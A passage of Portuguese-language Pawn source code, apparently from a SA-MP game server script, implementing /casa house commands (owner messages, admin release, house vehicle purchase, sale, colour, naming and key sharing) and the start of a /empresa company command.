				ComprandoCasaOferecida(playerid);
				CasaOferecida[playerid] = false;
				return 1;
			}
			return 1;
		}
        else if(!strcmp(tmp, "mensagem", true))
        {
	 		for(new c; c < MAX_CASAS; ++c)
	   		{
	    		if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
   		       		if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
					new
						casaMensagem[128]
					;
					casaMensagem = strrest(cmdtext, idx);
					if(!strlen(casaMensagem))
					{
					    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Mensagem [Mensagem]");
					    return 1;
					}
					if(strlen(casaMensagem) > 25)
					{
					    SendClientMessage(playerid, COR_ERRO, "Mensagem muito grande! (Máx: 25 caracteres)");
						return 1;
					}
					format(gStr, sizeof(gStr), "Você alterou a mensagem de sua casa para: {FFFFFF}%s", casaMensagem);
					SendClientMessage(playerid, COR_AMARELO, gStr);
					format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
					WE_SetString(hFile, "Mensagem", casaMensagem);
					format(CasaInfo[c][Mensagem], 25, casaMensagem);
				 	return 1;
            	}
            }
  		}
  		else if(!strcmp(tmp, "shop", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
				if(aInfo[playerid][Admin] == 1)
				{
				    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
					    format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);

						WE_SetInt(hFile, "Shopping", 1);

						SendClientMessage(playerid, COR_AMARELO, "Casa reservada para o shopping.");
					}
					return 1;
				}
				else return SendClientMessage(playerid, 0xFF0000AA, "Comando inexistente, use: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos");
			}
        }
		else if(!strcmp(tmp, "liberar", true))
        {
            if(aInfo[playerid][Admin] == 1)
            {
				for(new c; c < MAX_CASAS; ++c)
				{
				    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
                        format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[c][Proprietario]);
						WE_SetInt(gFile, "Casa", -1);
						WE_SetInt(gFile, "Spawn", 0);
               			WE_SetInt(gFile, "Impostos", 0);
            			WE_SetInt(gFile, "Atrasados", 0);
						new
							strC[128]
						;
	                    if(strcmp(CasaInfo[c][Morador], "Ninguem", false))
	                    {
	                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador]);
							WE_SetInt(strC, "MorandoID", -1);
							WE_SetInt(strC, "Spawn", 0);
	                    }
	                    if(strcmp(CasaInfo[c][Morador2], "Ninguem", false))
	                    {
	                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador2]);
							WE_SetInt(strC, "MorandoID", -1);
							WE_SetInt(strC, "Spawn", 0);
	                    }
	                    if(strcmp(CasaInfo[c][Morador3], "Ninguem", false))
	                    {
	                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador3]);
							WE_SetInt(strC, "MorandoID", -1);
							WE_SetInt(strC, "Spawn", 0);
	                    }
       					DestroyPickup(CasaPickup[c]);
						CasaPickup[c] = CreatePickup(1273, 23, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]);
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						format(CasaInfo[c][Proprietario], 12, "Ninguem");
						WE_SetString(hFile, "Proprietario", "Ninguem");
						format(CasaInfo[c][Morador], 12, "Ninguem");
						WE_SetString(hFile, "Morador", "Ninguem");
	   					format(CasaInfo[c][Morador2], 12, "Ninguem");
						WE_SetString(hFile, "Morador2", "Ninguem");
						format(CasaInfo[c][Morador3], 12, "Ninguem");
						WE_SetString(hFile, "Morador3", "Ninguem");
						format(CasaInfo[c][Login], 12, "00/00/0000");
						WE_SetString(hFile, "Login", "00/00/0000");
						format(CasaInfo[c][Mensagem], 12, "Nada");
						WE_SetString(hFile, "Horario", "00:00:00 ");
						format(CasaInfo[c][Horario], 12, "00:00:00");
						WE_SetString(hFile, "Mensagem", "Nada");
	                    WE_SetInt(hFile, "Status", 0);
	                    CasaInfo[c][Status] = 0;
	                    WE_SetInt(hFile, "Dono", 0);
						WE_SetInt(hFile, "CarModel", 0);
						cInfo[CasaInfo[c][Numero]][CarModel] = 0;
	     				WE_SetString(hFile, "vNome", "Veículo Casa");
	     				SetVehicleVirtualWorld(cInfo[CasaInfo[c][Numero]][HouseCar], 999);
	     				Update3DTextLabelText(cInfo[CasaInfo[c][Numero]][Label], 0xFFFFFFAA, "		");
		   				new
							zone[MAX_ZONE_NAME]
						;
						GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
						format(gstring, sizeof(gstring), "O(A) administrador(a) {FFFFFF}%s {4EB84A}liberou a Casa ID {FFFFFF}%d, {4EB84A}localizada em: {FFFFFF}%s", PlayerName(playerid), CasaInfo[c][Numero], zone);
						SendClientMessageToAll(0x4EB84AFF, gstring);
						format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {F03400} {FFFFFF}- {00FF00}Sem dono(a)\n{FFFFFF}/Casa Info", CasaInfo[c][Numero]);
						Update3DTextLabelText(CasaLabel[c], COR_BRANCO, gStr);
						return 1;
				    }
				}
			}
			else return SendClientMessage(playerid, 0xFF0000AA, "Comando inexistente, use: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos");
        }
		else if(!strcmp(tmp, "veiculo", true))
	  	{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
  				SendClientMessage(playerid, COR_ERRO, "Para estacionar o veículo de sua casa digite: {FFFFFF}/VeiculoEstacionar");
			    SendClientMessage(playerid, COR_ERRO, "Opções disponíveis: Comprar, Respawn, Cor, Nome, Cornome, Liberar, Trancar, Conceder, Desconceder, Vender, Recriar, Spawn");
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo {FFFFFF}[Opção desejada]");
				return 1;
			}
			if(strcmp(tmp, "vender", true) == 0)
            {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
   		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						if(WE_GetInt(hFile, "CarModel") == 0)
						{
						    SendClientMessage(playerid, COR_ERRO, "Sua casa não possui nenhum veículo!");
						   	return 1;
						}
      					switch(WE_GetInt(hFile, "CarModel"))
						{
							case 400: vPreco[playerid] = PRECO_LANDSTALKER;
							case 401: vPreco[playerid] = PRECO_BRAVURA;
							case 402: vPreco[playerid] = PRECO_BUFFALO;
							case 404: vPreco[playerid] = PRECO_PERENNIEL;
							case 409: vPreco[playerid] = PRECO_STRETCH;
							case 411: vPreco[playerid] = PRECO_INFERNUS;
							case 412: vPreco[playerid] = PRECO_VOODOO;
							case 415: vPreco[playerid] = PRECO_CHEETAH;
							case 418: vPreco[playerid] = PRECO_MOONBEAM;
							case 419: vPreco[playerid] = PRECO_ESPERANTO;
							case 421: vPreco[playerid] = PRECO_WASHINGTON;
							case 422: vPreco[playerid] = PRECO_BOBCAT;
							case 424: vPreco[playerid] = PRECO_BF_INJECTION;
							case 429: vPreco[playerid] = PRECO_BANSHEE;
							case 434: vPreco[playerid] = PRECO_HOTKNIFE;
							case 445: vPreco[playerid] = PRECO_ADMIRAL;
							case 451: vPreco[playerid] = PRECO_TURISMO;
							case 461: vPreco[playerid] = PRECO_PCJ_600;
							case 462: vPreco[playerid] = PRECO_FAGGIO;
							case 463: vPreco[playerid] = PRECO_FREEWAY;
							case 466: vPreco[playerid] = PRECO_GLENDALE;
							case 468: vPreco[playerid] = PRECO_SANCHEZ;
							case 471: vPreco[playerid] = PRECO_QUAD;
							case 474: vPreco[playerid] = PRECO_HERMES;
							case 475: vPreco[playerid] = PRECO_SABRE;
							case 477: vPreco[playerid] = PRECO_ZR_350;
							case 478: vPreco[playerid] = PRECO_WALTON;
							case 480: vPreco[playerid] = PRECO_COMET;
							case 481: vPreco[playerid] = PRECO_BMX;
							case 482: vPreco[playerid] = PRECO_BURRITO;
							case 483: vPreco[playerid] = PRECO_CAMPER;
							case 489: vPreco[playerid] = PRECO_RANCHER;
							case 491: vPreco[playerid] = PRECO_VIRGO;
							case 492: vPreco[playerid] = PRECO_GREENWOOD;
							case 494: vPreco[playerid] = PRECO_HOTRING;
							case 495: vPreco[playerid] = PRECO_SANDKING;
							case 496: vPreco[playerid] = PRECO_BLISTA_COMPACT;
							case 498: vPreco[playerid] = PRECO_BOXVILLE;
							case 500: vPreco[playerid] = PRECO_MESA;
							case 504: vPreco[playerid] = PRECO_BLOODRING_BANGER;
							case 505: vPreco[playerid] = PRECO_RANCHER;
							case 506: vPreco[playerid] = PRECO_SUPER_GT;
							case 507: vPreco[playerid] = PRECO_ELEGANT;
							case 509: vPreco[playerid] = PRECO_BIKE;
							case 517: vPreco[playerid] = PRECO_MAJESTIC;
							case 518: vPreco[playerid] = PRECO_BUCCANEER;
							case 521: vPreco[playerid] = PRECO_FCR_900;
							case 522: vPreco[playerid] = PRECO_NRG_500;
							case 529: vPreco[playerid] = PRECO_WILLARD;
							case 533: vPreco[playerid] = PRECO_FELTZER;
							case 534: vPreco[playerid] = PRECO_REMINGTON;
							case 535: vPreco[playerid] = PRECO_SLAMVAM;
							case 536: vPreco[playerid] = PRECO_BLADE;
							case 540: vPreco[playerid] = PRECO_VINCENT;
							case 541: vPreco[playerid] = PRECO_BULLET;
							case 542: vPreco[playerid] = PRECO_CLOVER;
							case 543: vPreco[playerid] = PRECO_SADLER;
							case 545: vPreco[playerid] = PRECO_HUSTLER;
							case 546: vPreco[playerid] = PRECO_URANUS;
							case 550: vPreco[playerid] = PRECO_SUNRISE;
							case 554: vPreco[playerid] = PRECO_YOSEMITE;
							case 558: vPreco[playerid] = PRECO_URANOS;
							case 559: vPreco[playerid] = PRECO_JESTER;
							case 560: vPreco[playerid] = PRECO_SULTAN;
							case 561: vPreco[playerid] = PRECO_STRATUM;
							case 562: vPreco[playerid] = PRECO_ELEGY;
							case 565: vPreco[playerid] = PRECO_FLASH;
							case 567: vPreco[playerid] = PRECO_SAVANNA;
							case 568: vPreco[playerid] = PRECO_BANDITO;
							case 571: vPreco[playerid] = PRECO_KART;
							case 575: vPreco[playerid] = PRECO_BROADWAY;
							case 576: vPreco[playerid] = PRECO_TORNADO;
							case 579: vPreco[playerid] = PRECO_HUNTLEY;
							case 580: vPreco[playerid] = PRECO_STAFFORD;
							case 581: vPreco[playerid] = PRECO_BF_400;
							case 585: vPreco[playerid] = PRECO_EMPEROR;
							case 586: vPreco[playerid] = PRECO_WAYFARER;
							case 587: vPreco[playerid] = PRECO_EUROS;
							case 589: vPreco[playerid] = PRECO_CLUB;
							case 600: vPreco[playerid] = PRECO_PICADOR;
							case 602: vPreco[playerid] = PRECO_ALPHA;
							case 603: vPreco[playerid] = PRECO_PHOENIX;
							case 604: vPreco[playerid] = PRECO_GLENDALE;
							case 605: vPreco[playerid] = PRECO_SADLER;
							case 609: vPreco[playerid] = PRECO_BOXVILLE;
						}
						SendClientMessage(playerid, AZUL_WE, " [Venda Veículo] ");
						format(gStr, sizeof(gStr), "Veículo %s vendido, valor recebido: R$%d.", vNome[WE_GetInt(hFile, "CarModel")-400], (vPreco[playerid] * 90 / 100));
						SendClientMessage(playerid, COR_BRANCO, gStr);
						SendClientMessage(playerid, AZUL_WE, " [Venda Veículo] ");
						sGivePlayerCash(playerid, vPreco[playerid] * 90 / 100);
						SetVehicleVirtualWorld(cInfo[CasaInfo[c][Numero]][HouseCar], 999);
						cInfo[CasaInfo[c][Numero]][CarModel] = 0;
						WE_SetInt(hFile, "CarModel", 0);
     					WE_SetString(hFile, "vNome", "Veículo Casa");
						Update3DTextLabelText(cInfo[CasaInfo[c][Numero]][Label], 0xFFFFFFAA, "		");
						vPreco[playerid] = 0;
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "comprar", true))
            {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
   		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						if(WE_GetInt(hFile, "useCar") == 0)
						{
						    SendClientMessage(playerid, COR_ERRO, "Essa casa não pode ter veículo!");
							return 1;
						}
						pInfo[playerid][Casa] = CasaInfo[c][Numero];
						new
							vIndex[] = "1. Carros\n2. Motos"
						;
						ShowPlayerDialog(playerid, D_vINDEX, DIALOG_STYLE_LIST, "Selecione a categoria", vIndex, "Ok", "Cancelar");
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "respawn", true))
            {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
						if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false) &&
							strcmp(CasaInfo[c][Morador], PlayerName(playerid), false) &&
							strcmp(CasaInfo[c][Morador2], PlayerName(playerid), false) &&
							strcmp(CasaInfo[c][Morador3], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						    return 1;
						}
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
     					if(WE_GetInt(hFile, "CarModel") == 0)
						{
						    SendClientMessage(playerid, COR_ERRO, "Sua casa não possui nenhum veículo!");
						   	return 1;
						}
                        if(!strcmp(CasaInfo[c][Morador], PlayerName(playerid), true))
                        {
                            if(WE_GetInt(hFile, "vM1") == 0)
                            {
                                SendClientMessage(playerid, COR_ERRO, "Você não tem privilégios para usar esse comando!");
                                return 1;
                            }
                        }
                		if(!strcmp(CasaInfo[c][Morador2], PlayerName(playerid), true))
                        {
                            if(WE_GetInt(hFile, "vM2") == 0)
                            {
                                SendClientMessage(playerid, COR_ERRO, "Você não tem privilégios para usar esse comando!");
                                return 1;
                            }
                        }
                      	if(!strcmp(CasaInfo[c][Morador3], PlayerName(playerid), true))
                        {
                            if(WE_GetInt(hFile, "vM3") == 0)
                            {
                                SendClientMessage(playerid, COR_ERRO, "Você não tem privilégios para usar esse comando!");
                                return 1;
                            }
                        }
						SendClientMessage(playerid, AZUL_WE, "Seu veículo foi respawnado!");
						if(GetVehicleVirtualWorld(cInfo[CasaInfo[c][Numero]][HouseCar]) != 999)
                 		{
							SetVehicleToRespawn(cInfo[CasaInfo[c][Numero]][HouseCar]);
							SetVehicleVirtualWorld(cInfo[CasaInfo[c][Numero]][HouseCar], 0);
						}
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "cor", true))
            {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Cor [Cor ID 1] [Cor ID 2]");
							return 1;
						}
						new
							vColor1 = strval(tmp)
						;
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Cor [Cor ID 1] [Cor ID 2]");
							return 1;
						}
						new
							vColor2 = strval(tmp)
						;
						format(gStr, sizeof(gStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);
						if(!fexist(gStr)) WE_CreateFile(gStr);
						format(gstring, sizeof(gstring), "As cores de seu veículo foram alteradas para: {FFFFFF}Cor ID 1: %d, Cor ID 2: %d.", vColor1, vColor2);
						SendClientMessage(playerid, AZUL_WE, gstring);
						WE_SetInt(gStr, "Cor1", vColor1);
						WE_SetInt(gStr, "Cor2", vColor2);
						ChangeVehicleColor(cInfo[CasaInfo[c][Numero]][HouseCar], vColor1, vColor2);
						cInfo[CasaInfo[c][Numero]][t_Cor_1] = vColor1;
						cInfo[CasaInfo[c][Numero]][t_Cor_2] = vColor2;
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "recriar", true))
			{
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						SendClientMessage(playerid, AZUL_WE, "Você redefiniu o spawn de seu veículo para o spawn original.");
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						WE_SetFloat(hFile, "newCarX", 0.0);
						WE_SetFloat(hFile, "newCarY", 0.0);
						WE_SetFloat(hFile, "newCarZ", 0.0);
						WE_SetFloat(hFile, "newCarAng", 0.0);
						WE_SetInt(hFile, "newSpawn", 0);
						WE_SetInt(hFile, "Respawn", -1);
						cInfo[CasaInfo[c][Numero]][NewCar] = 1;
						SetTimerEx("NewCarH", 1000, false, "d", CasaInfo[c][Numero]);
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "spawn", true))
			{
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Spawn [Tempo]");
							return 1;
						}
						new
							respawnTempo = strval(tmp)
						;
						SendClientMessage(playerid, AZUL_WE, "O tempo de respawn de seu veículo foi redefinido.");
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						WE_SetInt(hFile, "Respawn", respawnTempo);
						cInfo[CasaInfo[c][Numero]][NewCar] = 1;
						SetTimerEx("NewCarH", 1000, false, "d", CasaInfo[c][Numero]);
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "nome", true))
	        {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
      					new
							veiculoMsg[128]
						;
	                    if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						veiculoMsg = strrest(cmdtext, idx);
						if(!strlen(veiculoMsg))
						{
						    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Nome [Nome]");
						    return 1;
						}
						if(strlen(veiculoMsg) > 25)
						{
						    SendClientMessage(playerid, COR_ERRO, "Nome muito grande! (Máximo de 25 caracteres)");
							return 1;
						}
						SendClientFormat(playerid, AZUL_WE, "Você alterou o nome de seu veículo para: {FFFFFF}%s", veiculoMsg);
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						WE_SetString(hFile, "vNome", veiculoMsg);
						new
						    color = WE_GetInt(hFile, "vColorID")
						;
  						Update3DTextLabelText(cInfo[CasaInfo[c][Numero]][Label], SetVehCorName(color), veiculoMsg);
					 	return 1;
	            	}
	            }
	  		}
			else if(!strcmp(tmp, "cornome", true))
	        {
	            for(new c; c < MAX_CASAS; ++c)
	            {
	    			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
	                    if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							return 1;
						}
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Cornome [Cor de 0 à 44]");
							return 1;
						}
						new
							nColor = strval(tmp)
						;
						format(gStr, sizeof(gStr), "Você alterou a cor do nome do seu veículo para o ID {FFFFFF}%d", nColor);
						SendClientMessage(playerid, AZUL_WE, gStr);
						format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
  						Update3DTextLabelText(cInfo[CasaInfo[c][Numero]][Label], SetVehCorName(nColor), WE_GetString(hFile, "vNome"));
  						WE_SetInt(hFile, "vColorID", nColor);
	            	}
	            }
	            return 1;
	  		}
 			else if(!strcmp(tmp, "liberar", true))
            {
				for(new c; c < MAX_CASAS; ++c)
				{
					if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
			   			{
			   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						   	return 1;
						}
						SendClientMessage(playerid, AZUL_WE, "Você deixou a cópia da chave de seu veículo para que todos possam dirigí-lo.");
                        format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						WE_SetInt(hFile, "vLiberado", 1);
						CasaInfo[c][vLiberado] = 1;
						return 1;
					}
				}
			}
  			else if(!strcmp(tmp, "trancar", true))
            {
				for(new c; c < MAX_CASAS; ++c)
				{
					if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
					{
		       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
			   			{
			   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						   	return 1;
						}
						SendClientMessage(playerid, COR_AMARELO, "Você trancou seu veículo para que ninguém possa dirigí-lo.");
                        format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						WE_SetInt(hFile, "vLiberado", 0);
						CasaInfo[c][vLiberado] = 0;
						return 1;
					}
				}
			}
			else if(!strcmp(tmp, "conceder", true))
			{
				tmp = strtok(cmdtext, idx);
	  			if(!strlen(tmp))
	  			{
	  			    SendClientMessage(playerid, COR_ERRO, "Opções: m1 = Morador 1 / m2 = Morador 2 / m3 = Morador 3");
	  			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Conceder {FFFFFF}[Opção]");
					return 1;
				}
				if(!strcmp(tmp, "m1", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, AZUL_WE, "Você deu as chaves de seu veículo para o morador 1.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM1", 1);
							CasaInfo[c][vM1] = 1;
							return 1;
						}
					}
				}
				else if(!strcmp(tmp, "m2", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, AZUL_WE, "Você deu as chaves de seu veículo para o morador 2.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM2", 1);
							CasaInfo[c][vM2] = 1;
							return 1;
						}
					}
				}
				else if(!strcmp(tmp, "m3", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, AZUL_WE, "Você deu as chaves de seu veículo para o morador 3.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM3", 1);
							CasaInfo[c][vM3] = 1;
							return 1;
						}
					}
				}
			}
			else if(!strcmp(tmp, "desconceder", true))
			{
				tmp = strtok(cmdtext, idx);
	  			if(!strlen(tmp))
	  			{
	  			    SendClientMessage(playerid, COR_ERRO, "Opções: m1 = Morador 1 / m2 = Morador 2 / m3 = Morador 3");
	  			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Veiculo Desconceder {FFFFFF}[Opção]");
					return 1;
				}
				if(!strcmp(tmp, "m1", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, AZUL_WE, "Você trancou seu veículo para que o morador 1 não possa dirigí-lo.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM1", 0);
							CasaInfo[c][vM1] = 0;
							return 1;
						}
					}
				}
				else if(!strcmp(tmp, "m2", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, COR_AMARELO, "Você trancou seu veículo para que o morador 2 não possa dirigí-lo.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM2", 0);
							CasaInfo[c][vM2] = 0;
							return 1;
						}
					}
				}
				else if(!strcmp(tmp, "m3", true))
				{
					for(new c; c < MAX_CASAS; ++c)
					{
						if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
						{
			       			if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				   			{
				   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
							   	return 1;
							}
							SendClientMessage(playerid, COR_AMARELO, "Você trancou seu veículo para que o morador 3 não possa dirigí-lo.");
                            format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
							WE_SetInt(hFile, "vM3", 0);
							CasaInfo[c][vM3] = 0;
							return 1;
						}
					}
				}
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/empresa", true))
	{
   		Tempo[playerid] = gettime();

		if(Tempo[playerid] - CompanyPickup[playerid] > 5)
		{
    		SendClientMessage(playerid, COR_ERRO, "Você não está em uma empresa!");
    		return 1;
		}

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
     	{
	    	SendClientMessage(playerid, COR_ERRO, "Uso válido: /Empresa [Comprar/Vender/Entrar/Sair/Info/Comandos]");
	    	return 1;
      	}
       	else if(!strcmp(tmp, "comandos", true))
        {
         	for(new m = 0; m < MAX_EMPRESAS; ++m)
           	{
           		if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
            	{
                 	if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) e nem funcionário(a) desta empresa!");
						return 1;
					}
                   	SendClientMessage(playerid, VERMELHO_WE, " COMANDOS EMPRESA:");
